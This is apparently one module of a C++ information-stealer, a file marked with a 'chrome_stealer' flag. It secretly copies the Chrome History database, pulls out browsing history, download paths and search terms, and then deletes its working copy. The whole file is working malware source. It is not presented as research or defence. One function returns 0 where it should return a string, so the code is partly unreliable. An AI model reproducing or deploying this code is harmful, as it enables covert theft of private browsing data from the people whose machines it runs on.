#include <string>
#include <locale>
#include <windows.h>

#include "Config.h"

#if chrome_stealer
	#include "sqlite3.h"


#pragma warning(disable: 4996)

const char* data = "";
char* err = 0;
std::string ret = "";
std::string ret_downloads = "";
std::string ret_requests = "";

bool direxists(const std::wstring& dirName_in) {
	DWORD ftyp = GetFileAttributesW(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;

	return false;
}

int callback_downloads(void* data, int argc, char** argv, char** azColName) {
	for (int i = 0; i < argc; ++i) {
		try {
			if (argv[i]) {
				ret_downloads += azColName[i];
				ret_downloads += " = ";
				ret_downloads += argv[i];
			}
			else {
				ret_downloads += azColName[i];
				ret_downloads += " = NULL";
			}
			ret_downloads += "\n";
		}
		catch (...) {
			ret_downloads += "NULL\n";
		}
	}
	ret_downloads += "\n\n";
	return 0;
}

int callback_history(void* data, int argc, char** argv, char** azColName) {
	for (int i = 0; i < argc; ++i) {
		try {
			if (argv[i]) {
				ret += azColName[i];
				ret += " = ";
				ret += argv[i];
			}
			else {
				ret += azColName[i];
				ret += " = NULL";
			}
			ret += "\n";
		}
		catch (...) {
			ret += "NULL\n";
		}
	}
	ret += "\n\n";
	return 0;
}

int callback_request(void* data, int argc, char** argv, char** azColName) {
	for (int i = 0; i < argc; ++i) {
		try {
			ret_requests += argv[i];
		} catch (...) {
			ret_requests += "NULL\n";
		}
	}
	ret_requests += "\n";
	return 0;
}

std::string get_chrome_downloads(std::string database_name) {
	ret_downloads = "";
	sqlite3* db = 0;
	const char* sql = "SELECT id, current_path, referrer, last_modified FROM downloads";

	if (!(sqlite3_open(database_name.c_str(), &db))) {
		sqlite3_exec(db, sql, 0, 0, &err);
		if (sqlite3_exec(db, sql, callback_downloads, (void*)data, &err) == SQLITE_OK)
			sqlite3_free(err);
		else return "none";
		sqlite3_close(db);
	}
	_wsystem(L"del History");
	return ret_downloads;
}

std::string get_chrome_history(std::string database_name) {
	ret = "";
	sqlite3* db = 0;
	const char* sql = "SELECT id, url, title FROM urls";

	if (!(sqlite3_open(database_name.c_str(), &db))) {
		sqlite3_exec(db, sql, 0, 0, &err);
		if (sqlite3_exec(db, sql, callback_history, (void*)data, &err) == SQLITE_OK)
			sqlite3_free(err);
		else return "none";
		sqlite3_close(db);
	}
	_wsystem(L"del History");
	return ret;
}

std::string get_chrome_requests(std::string database_name) {
	ret_requests = "";
	sqlite3* db = 0;
	const char* sql = "SELECT term FROM keyword_search_terms";

	if (!(sqlite3_open(database_name.c_str(), &db))) {
		sqlite3_exec(db, sql, 0, 0, &err);
		if (sqlite3_exec(db, sql, callback_request, (void*)data, &err) == SQLITE_OK) {
			sqlite3_free(err);
		}
		else return 0;
		sqlite3_close(db);
	}
	_wsystem(L"del History");
	return ret_requests;
}

std::wstring cpy_history() {
	std::locale system("");
	std::locale::global(system);

	// getting path to AppData
	std::wstring chrome_path = _wgetenv(L"LOCALAPPDATA");
	chrome_path += L"\\Google\\Chrome\\User Data\\Default\\";
	std::wstring history = chrome_path + L"History";

	if (!(direxists(chrome_path))) return L"none";
	std::wstring command = L"copy /B \"" + history + L"\" /B History";
	return command;
}

std::string GetChromeHistory() {	
	_wsystem(cpy_history().c_str());
	return get_chrome_history("History");
}

std::string GetChromeDownloads() {
	_wsystem(cpy_history().c_str());
	return get_chrome_downloads("History");
}

std::string GetChromeRequests() {
	_wsystem(cpy_history().c_str());
	return get_chrome_requests("History");
}

#endif // chrome_stealer